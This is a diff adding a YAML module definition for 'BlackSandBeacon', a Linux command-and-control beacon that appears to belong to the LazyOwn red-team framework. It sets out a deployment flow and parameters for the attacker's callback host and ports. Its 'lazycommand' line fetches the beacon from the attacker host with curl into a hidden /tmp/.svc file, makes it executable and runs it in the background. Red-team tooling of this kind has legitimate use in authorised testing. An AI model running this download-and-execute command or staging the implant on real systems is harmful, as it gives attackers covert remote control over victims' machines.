@@ -1,0 +1,45 @@
+name: blacksandbeacon
+description: 'BlackSandBeacon is a Linux-native C beacon with first-class Beacon
+  Object File (BOF) support via ELF shared-object injection and direct Linux syscalls.
+  It pairs with LazyOwn''s malleable C2 profile over HTTPS and is the only open-source
+  C2 implant that brings BOF extensibility to Linux targets — a capability absent
+  from commercial C2 frameworks including Cobalt Strike.
+
+  Architecture: C beacon + dlopen BOF runtime. BOFs are compiled as position-independent
+  ELF shared objects (.so) and loaded into the beacon process at runtime. Arguments
+  are passed through a datap API mirroring the Windows BOF contract so existing BOF
+  source code can be ported with minimal changes.
+
+  Deployment flow:
+    1. Run `blacksandbeacon` to compile and stage the binary.
+    2. Deliver the staged binary to the target (use `lazycommand` or drop manually).
+    3. Use `blacksandbeacon_bof` to load and execute a BOF against a live session.
+
+  '
+author: LazyOwn RedTeam
+version: '1.0'
+enabled: true
+params:
+- name: lhost
+  type: string
+  required: true
+  description: Attacker C2 IP or hostname the beacon will call back to.
+- name: lport
+  type: string
+  required: true
+  description: C2 listener port (HTTP staging endpoint).
+- name: c2_port
+  type: string
+  required: true
+  description: C2 HTTPS port (encrypted command channel).
+tool:
+  name: blacksandbeacon
+  repo_url: https://github.com/grisuno/blacksandbeacon.git
+  install_path: external/.exploit/blacksandbeacon
+  install_command: make
+  execute_command: git restore . ; git pull ; make && cp blacksandbeacon ../../../sessions/blacksandbeacon
+    && echo "[blacksandbeacon] beacon staged at sessions/blacksandbeacon"
+  download_file: /tmp/.svc
+  lazycommand: curl -sk "http://{lhost}:{lport}/blacksandbeacon" -o /tmp/.svc && chmod
+    +x /tmp/.svc && /tmp/.svc &
+category: 10. Command & Control
